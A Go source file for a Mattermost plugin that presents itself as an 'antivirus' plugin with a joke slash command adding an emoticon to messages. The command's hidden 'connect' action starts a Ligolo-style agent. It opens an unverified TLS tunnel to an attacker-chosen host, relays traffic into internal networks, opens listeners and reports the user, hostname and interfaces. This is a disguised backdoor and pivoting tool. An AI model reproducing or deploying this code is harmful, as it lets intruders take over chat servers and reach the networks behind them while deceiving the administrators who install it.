package main

import (
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"net"
	"os"
	"os/user"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/hashicorp/yamux"
	"github.com/mattermost/mattermost-server/v6/model"
	"github.com/mattermost/mattermost-server/v6/plugin"
	"github.com/sirupsen/logrus"

	"github.com/mattermost/mattermost-plugin-antivirus/pkg/agent/neterror"
	"github.com/mattermost/mattermost-plugin-antivirus/pkg/agent/smartping"
	"github.com/mattermost/mattermost-plugin-antivirus/pkg/protocol"
	"github.com/mattermost/mattermost-plugin-antivirus/pkg/relay"
)

const (
	actionConnect = "connect"
)

func (p *Plugin) getCommand() (*model.Command, error) {
	return &model.Command{
		Trigger:          "gimme",
		AutoCompleteDesc: "gimme [повідомлення]",
		Description:      "Додати ༼ つ ◕_◕ ༽つ до вашого повідомлення",
	}, nil
}

func (p *Plugin) ExecuteCommand(c *plugin.Context, args *model.CommandArgs) (*model.CommandResponse, *model.AppError) {
	_, err := p.executeCommand(c, args)
	if err != nil {
		p.MattermostPlugin.API.LogWarn("failed to execute command", "error", err.Error())
	}
	return &model.CommandResponse{}, nil
}

func (p *Plugin) sendMessage(channelID string, message string) {
	post := &model.Post{
		UserId:    p.botUserID,
		ChannelId: channelID,
		Message:   message,
	}
	_, _ = p.MattermostPlugin.API.CreatePost(post)
}

func (p *Plugin) executeCommand(_ *plugin.Context, args *model.CommandArgs) (string, error) {
	split := strings.Fields(args.Command)
	if len(split) < 2 {
		return "Invalid number of arguments", nil
	}
	command := split[1]

	//p.sendMessage(args.ChannelId, "Hello !")

	switch command {
	case actionConnect:
		if len(split) != 4 {
			return "Invalid number of arguments, expecting three", nil
		}
		address := split[2]
		port, parseErr := strconv.Atoi(split[3])
		if parseErr != nil || !(port > 0 && port <= 65535) {
			return "Port must be a integer between 1 and 65535", nil
		}
		_ = p.connectProxy(address, port)

	}
	return "", nil
}

var listenerConntrack map[int32]net.Conn
var listenerMap map[int32]net.Listener
var connTrackID int32
var listenerID int32

func (p *Plugin) connectProxy(address string, port int) error {
	f := func() {
		var tlsConfig tls.Config

		serverAddr := fmt.Sprintf("%s:%d", address, port)

		host, _, err := net.SplitHostPort(serverAddr)
		if err != nil {
			return
		}
		tlsConfig.ServerName = host
		tlsConfig.InsecureSkipVerify = true

		var conn net.Conn

		listenerConntrack = make(map[int32]net.Conn)
		listenerMap = make(map[int32]net.Listener)

		for {
			var err error
			conn, err = net.Dial("tcp", serverAddr)
			if err == nil {
				_ = connect(conn, &tlsConfig)
			}
			if err != nil {
				return
			}
		}
	}
	go f()
	return nil
}

func connect(conn net.Conn, config *tls.Config) error {
	tlsConn := tls.Client(conn, config)

	yamuxConn, err := yamux.Server(tlsConn, yamux.DefaultConfig())
	if err != nil {
		return err
	}

	logrus.WithFields(logrus.Fields{"addr": tlsConn.RemoteAddr()}).Info("Connection established")

	for {
		conn, err := yamuxConn.Accept()
		if err != nil {
			return err
		}
		go handleConn(conn)
	}
}

// Listener is the base class implementing listener sockets for Ligolo
type Listener struct {
	net.Listener
}

// NewListener register a new listener
func NewListener(network string, addr string) (Listener, error) {
	lis, err := net.Listen(network, addr)
	if err != nil {
		return Listener{}, err
	}
	return Listener{lis}, nil
}

// ListenAndServe fill new listener connections to a channel
func (s *Listener) ListenAndServe(connTrackChan chan int32) error {
	for {
		conn, err := s.Accept()
		if err != nil {
			return err
		}
		connTrackID++
		connTrackChan <- connTrackID
		listenerConntrack[connTrackID] = conn
	}
}

// Close request the main listener to exit
func (s *Listener) Close() error {
	return s.Listener.Close()
}

func handleConn(conn net.Conn) {
	decoder := protocol.NewDecoder(conn)
	if err := decoder.Decode(); err != nil {
		panic(err)
	}

	e := decoder.Envelope.Payload
	switch decoder.Envelope.Type {
	case protocol.MessageConnectRequest:
		connRequest := e.(protocol.ConnectRequestPacket)
		encoder := protocol.NewEncoder(conn)

		logrus.Debugf("Got connect request to %s:%d", connRequest.Address, connRequest.Port)
		var network string
		if connRequest.Transport == protocol.TransportTCP {
			network = "tcp"
		} else {
			network = "udp"
		}
		if connRequest.Net == protocol.Networkv4 {
			network += "4"
		} else {
			network += "6"
		}

		var d net.Dialer
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		targetConn, err := d.DialContext(ctx, network, fmt.Sprintf("%s:%d", connRequest.Address, connRequest.Port))
		defer cancel()

		var connectPacket protocol.ConnectResponsePacket
		if err != nil {
			var serr syscall.Errno
			if errors.As(err, &serr) {
				// Magic trick ! If the error syscall indicate that the system responded, send back a RST packet!
				if neterror.HostResponded(serr) {
					connectPacket.Reset = true
				}
			}

			connectPacket.Established = false
		} else {
			connectPacket.Established = true
		}
		if err := encoder.Encode(protocol.Envelope{
			Type:    protocol.MessageConnectResponse,
			Payload: connectPacket,
		}); err != nil {
			logrus.Fatal(err)
		}
		if connectPacket.Established {
			relay.StartRelay(targetConn, conn)
		}
	case protocol.MessageHostPingRequest:
		pingRequest := e.(protocol.HostPingRequestPacket)
		encoder := protocol.NewEncoder(conn)

		pingResponse := protocol.HostPingResponsePacket{Alive: smartping.TryResolve(pingRequest.Address)}

		if err := encoder.Encode(protocol.Envelope{
			Type:    protocol.MessageHostPingResponse,
			Payload: pingResponse,
		}); err != nil {
			logrus.Fatal(err)
		}
	case protocol.MessageInfoRequest:
		var username string
		encoder := protocol.NewEncoder(conn)
		hostname, err := os.Hostname()
		if err != nil {
			hostname = "UNKNOWN"
		}

		userinfo, err := user.Current()
		if err != nil {
			username = "Unknown"
		} else {
			username = userinfo.Username
		}

		netifaces, err := net.Interfaces()
		if err != nil {
			logrus.Error("could not get network interfaces")
			return
		}
		infoResponse := protocol.InfoReplyPacket{
			Name:       fmt.Sprintf("%s@%s", username, hostname),
			Interfaces: protocol.NewNetInterfaces(netifaces),
		}

		if err := encoder.Encode(protocol.Envelope{
			Type:    protocol.MessageInfoReply,
			Payload: infoResponse,
		}); err != nil {
			logrus.Fatal(err)
		}
	case protocol.MessageListenerCloseRequest:
		// Request to close a listener
		closeRequest := e.(protocol.ListenerCloseRequestPacket)
		encoder := protocol.NewEncoder(conn)

		var err error
		if lis, ok := listenerMap[closeRequest.ListenerID]; ok {
			err = lis.Close()
		} else {
			err = errors.New("invalid listener id")
		}

		listenerResponse := protocol.ListenerCloseResponsePacket{
			Err: err != nil,
		}
		if err != nil {
			listenerResponse.ErrString = err.Error()
		}

		if err := encoder.Encode(protocol.Envelope{
			Type:    protocol.MessageListenerCloseResponse,
			Payload: listenerResponse,
		}); err != nil {
			logrus.Error(err)
		}

	case protocol.MessageListenerRequest:
		listenRequest := e.(protocol.ListenerRequestPacket)
		encoder := protocol.NewEncoder(conn)
		connTrackChan := make(chan int32)
		stopChan := make(chan error)

		listener, err := NewListener(listenRequest.Network, listenRequest.Address)
		if err != nil {
			listenerResponse := protocol.ListenerResponsePacket{
				ListenerID: 0,
				Err:        true,
				ErrString:  err.Error(),
			}
			if err := encoder.Encode(protocol.Envelope{
				Type:    protocol.MessageListenerResponse,
				Payload: listenerResponse,
			}); err != nil {
				logrus.Error(err)
			}
			return
		}

		listenerResponse := protocol.ListenerResponsePacket{
			ListenerID: listenerID,
			Err:        false,
			ErrString:  "",
		}
		listenerMap[listenerID] = listener.Listener
		listenerID++

		if err := encoder.Encode(protocol.Envelope{
			Type:    protocol.MessageListenerResponse,
			Payload: listenerResponse,
		}); err != nil {
			logrus.Error(err)
		}

		go func() {
			if err := listener.ListenAndServe(connTrackChan); err != nil {
				stopChan <- err
			}
		}()
		defer listener.Close()

		for {
			var bindResponse protocol.ListenerBindReponse
			select {
			case err := <-stopChan:
				logrus.Error(err)
				bindResponse = protocol.ListenerBindReponse{
					SockID:    0,
					Err:       true,
					ErrString: err.Error(),
				}
			case connTrackID := <-connTrackChan:
				bindResponse = protocol.ListenerBindReponse{
					SockID: connTrackID,
					Err:    false,
				}
			}

			if err := encoder.Encode(protocol.Envelope{
				Type:    protocol.MessageListenerBindResponse,
				Payload: bindResponse,
			}); err != nil {
				logrus.Error(err)
			}

			if bindResponse.Err {
				break
			}
		}
	case protocol.MessageListenerSockRequest:
		sockRequest := e.(protocol.ListenerSockRequestPacket)
		encoder := protocol.NewEncoder(conn)

		var sockResponse protocol.ListenerSockResponsePacket
		if _, ok := listenerConntrack[sockRequest.SockID]; !ok {
			// Handle error
			sockResponse.ErrString = "invalid or unexistant SockID"
			sockResponse.Err = true
		}

		if err := encoder.Encode(protocol.Envelope{
			Type:    protocol.MessageListenerSockResponse,
			Payload: sockResponse,
		}); err != nil {
			logrus.Fatal(err)
		}

		if sockResponse.Err {
			return
		}

		netConn := listenerConntrack[sockRequest.SockID]
		relay.StartRelay(netConn, conn)

	case protocol.MessageClose:
		os.Exit(0)
	}
}
